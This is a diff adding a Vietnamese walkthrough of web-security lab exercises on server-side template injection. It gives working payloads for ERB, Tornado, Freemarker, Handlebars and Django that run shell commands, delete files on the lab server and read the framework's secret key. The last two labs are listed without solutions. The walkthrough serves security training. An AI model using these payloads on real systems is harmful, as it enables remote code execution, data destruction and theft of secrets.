@@ -119,3 +119,181 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 - Sử dụng payload trên để sửa nội dung input trong "nickname" khi bắt gói tin bằng Burp Suite:
 
 
+
+## Server-side template injection Lab
+
+### Lab: Basic server-side template injection
+```
+This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
+
+To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+```
+Bài lab mô tả răng website này sử dung ERB template, điều này đã giúp chúng ta bỏ qua bước phân biệt template. Và để hoàn thành bài lab chúng ta phải xóa được file morale.txt của user Carlos.
+
+Đầu tiên chúng ta nên tìm hiểu thêm về loại template [ERB](https://puppet.com/docs/puppet/5.5/lang_template_erb.html) ở đây. Từ đó chúng ta có thể suy ra và áp dụng [ERB cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections) sau :
+```
+Ruby - Basic injections
+ERB:
+
+<%= 7 * 7 %>
+
+```
+Truy cập vào bài lab chúng ta thấy được 1 website bán hàng, và thấy được chức năng viewstock như sau:
+
+
+
+Bắt request lại và chúng ta thấy có 1 giao thức GET /?message=.... để trả về kết quả, đây có khả năng là lỗ hổng cho chúng ta khai thác, nên chúng ta thử payload của ERB để check :
+```
+<%= 7 * 7 %>
+
+```
+
+
+Tuy nhiên việc thử trực tiếp như thế sẽ không được vì bị lỗi giao thức, nên chúng ta phải mã hóa sang html encoding như sau:
+
+```
+<%25%3d+7*7+%25>
+```
+
+
+
+Điều này đã xác định đây chúng là nơi có lỗi SSTI. Truy cập cheatsheet và lấy ra payload thực thi như sau, làm tương tự như lúc trước.
+
+```
+<%= system('ls') %> = > %3c%25%3d%20system('ls')%20%25%3e
+```
+
+Và ta nhận thấy được kết quả trả về có file morale.txt, tuy nhiên đề bài yêu cầu là của người dùng carlos nên chúng ta sẽ theo đường dẫn /home/carlos/morale.txt để xóa chính xác file của carlos.
+```
+<%= system("rm /home/carlos/morale.txt") %> => %3c%25%3d%20system("rm%20/home/carlos/morale.txt")%20%25%3e
+```
+
+
+Và chúng ta đã solve được bài lab.
+
+
+### Lab: Basic server-side template injection (code context)
+```
+This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter
+```
+Lần này loại template chúng ta dùng lại là [Tornado](https://gist.github.com/jesseyv/1175064) , tương tự như thế chúng ta truy cập có thể tìm hiểu [Tornado injection](https://ajinabraham.com/blog/server-side-template-injection-in-tornado) tại đây.
+
+
+Sau đó truy cập bài lab
+
+
+```
+}}{{7*7}}
+```
+
+
+
+
+```
+}}{%+import+os+%}{{os.system('ls')
+```
+
+
+```
+}}{%+import+os+%}{{os.system('rm+/home/carlos/morale.txt')
+```
+
+
+### Lab: Server-side template injection using documentation
+```
+This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
+```
+Lần này bài lab yêu cầu chúng ta tự tìm ra template và xóa file morale.txt của carlos để hoàn thành bài lab.
+
+
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+```
+
+
+
+### Lab: Server-side template injection in an unknown language with a documented exploit
+```
+This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+```
+
+
+
+
+
+```
+wrtz{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+
+
+
+
+
+### Lab: Server-side template injection with information disclosure via user-supplied objects
+```
+This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
+
+To solve the lab, steal and submit the framework's secret key.
+
+You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
+```
+
+
+
+
+
+check payload 
+```
+{% debug %}
+```
+
+
+[django](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java)
+
+
+```
+{{settings.SECRET_KEY}}
+```
+
+
+### Lab: Server-side template injection in a sandboxed environment
+```
+This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.
+
+You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
+```
+
+
+
+
+
+### Lab: Server-side template injection with a custom exploit
+```
+This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter
+```
